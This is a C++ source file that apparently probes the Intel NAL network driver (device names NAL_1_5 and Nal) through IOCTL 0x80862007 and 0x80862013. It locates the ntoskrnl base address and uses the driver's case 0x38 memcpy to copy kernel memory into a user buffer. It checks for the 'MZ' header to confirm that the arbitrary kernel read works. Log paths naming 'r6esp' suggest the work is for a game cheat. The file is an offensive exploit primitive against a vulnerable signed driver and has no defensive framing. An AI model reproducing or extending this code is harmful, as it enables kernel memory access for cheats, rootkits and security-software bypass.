// p43.cpp - case 0x38 memcpy test, 0x1B/0x1C, slot reads with slot 0/1
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>
#pragma comment(lib, "psapi.lib")
typedef uint64_t u64; typedef uint32_t u32; typedef uint16_t u16; typedef uint8_t u8;

static HANDLE g_h = INVALID_HANDLE_VALUE;
static FILE*  g_log = nullptr;
static u8     g_big[0x1400];
static u8     g_dst[0x100];
static u8     g_dst2[0x100];
static u64    g_dstVA, g_dst2VA, g_nt;

static void L(const char* fmt, ...) {
    char s[2048]; va_list ap; va_start(ap, fmt);
    vsnprintf(s, sizeof s, fmt, ap); va_end(ap);
    printf("%s\n", s); fflush(stdout);
    if (g_log) { fprintf(g_log, "%s\n", s); fflush(g_log); }
}
static void Q(u8* b, u32 o, u64 v) { memcpy(b + o, &v, 8); }
static void D(u8* b, u32 o, u32 v) { memcpy(b + o, &v, 4); }
static u32  Gd(u8* b, u32 o) { u32 v; memcpy(&v, b + o, 4); return v; }
static u64  Gq(u8* b, u32 o) { u64 v; memcpy(&v, b + o, 8); return v; }
static DWORD Call(DWORD ioctl, u8* b, DWORD len) {
    DWORD br = 0;
    return DeviceIoControl(g_h, ioctl, b, len, b, len, &br, nullptr) ? 0 : GetLastError();
}

static void C38(u64 src, u64 dst, const char* nm) {
    memset(g_big, 0, 0x48);
    Q(g_big, 0x00, 0x38); Q(g_big, 0x08, 0x10);
    Q(g_big, 0x10, src);  Q(g_big, 0x18, dst);
    memset(g_dst, 0xCC, 0x20); memset(g_dst2, 0xCC, 0x20);
    DWORD e = Call(0x80862007, g_big, 0x48);
    u16 w = 0; memcpy(&w, g_dst, 2);
    L("C38 %-10s err=%lu r10=%016llX r18=%016llX dst=%04X %s",
      nm, e, Gq(g_big, 0x10), Gq(g_big, 0x18), w, (w == 0x5A4D) ? "***MZ***" : "");
}
static void C1x(u32 cas, u64 p10, const char* nm) {
    memset(g_big, 0, 0x48);
    Q(g_big, 0x00, cas); Q(g_big, 0x08, 8);
    Q(g_big, 0x10, p10);
    DWORD e = Call(0x80862007, g_big, 0x48);
    L("C%02X %-10s err=%lu r10=%016llX", cas, nm, e, Gq(g_big, 0x10));
}
static void S13(u32 cas, u32 tag, u64 slot, u32 off, const char* nm) {
    memset(g_big, 0, 0x48);
    Q(g_big, 0x00, cas); Q(g_big, 0x08, tag);
    Q(g_big, 0x18, slot); D(g_big, 0x20, off);
    DWORD e = Call(0x80862013, g_big, 0x48);
    L("S13 %-8s cas=%02X tag=%02X err=%lu r10=%08X", nm, cas, tag, e, Gd(g_big, 0x10));
}

int main() {
    g_dstVA = (u64)(ULONG_PTR)g_dst;
    g_dst2VA = (u64)(ULONG_PTR)g_dst2;
    g_log = fopen("C:\\r6esp\\p43.log", "w");
    const wchar_t* paths[] = { L"\\\\.\\NAL_1_5", L"\\\\.\\Nal", L"\\\\.\\NAL" };
    for (const wchar_t* p : paths) {
        g_h = CreateFileW(p, GENERIC_READ | GENERIC_WRITE,
                          FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_h != INVALID_HANDLE_VALUE) break;
    }
    if (g_h == INVALID_HANDLE_VALUE) { L("no device - start r6espNal_316_1"); return 1; }
    LPVOID mods[1024]; DWORD need = 0;
    EnumDeviceDrivers(mods, sizeof mods, &need);
    g_nt = (u64)(ULONG_PTR)mods[0];
    L("ntoskrnl=%016llX", g_nt);

    L("--- case 0x38 as memcpy ---");
    C38(g_nt, g_dstVA, "nt->dst");
    C38(g_nt + 0x1000, g_dstVA, "nt+1000->dst");
    C38(g_dstVA, g_dst2VA, "dst->dst2");

    L("--- case 0x1B / 0x1C ---");
    C1x(0x1B, g_nt, "nt");
    C1x(0x1B, 0, "zero");
    C1x(0x1C, g_nt, "nt");
    C1x(0x1C, 0, "zero");

    L("--- 0x80862013 slot reads, slot 0 and 1 ---");
    const u32 t18[] = { 0x18 };
    const u32 t20[] = { 0x20 };
    for (u32 tg : t18) {
        S13(0x0C, tg, 0, 0, "slot0");
        S13(0x0D, tg, 0, 0, "slot0");
        S13(0x0C, tg, 1, 0, "slot1");
        S13(0x0D, tg, 1, 0, "slot1");
    }
    for (u32 tg : t20) {
        S13(0x0E, tg, 0, 0, "slot0");
        S13(0x0F, tg, 0, 0, "slot0");
        S13(0x10, tg, 0, 0, "slot0");
    }
    L("=== p43 done ===");
    if (g_log) fclose(g_log);
    return 0;
}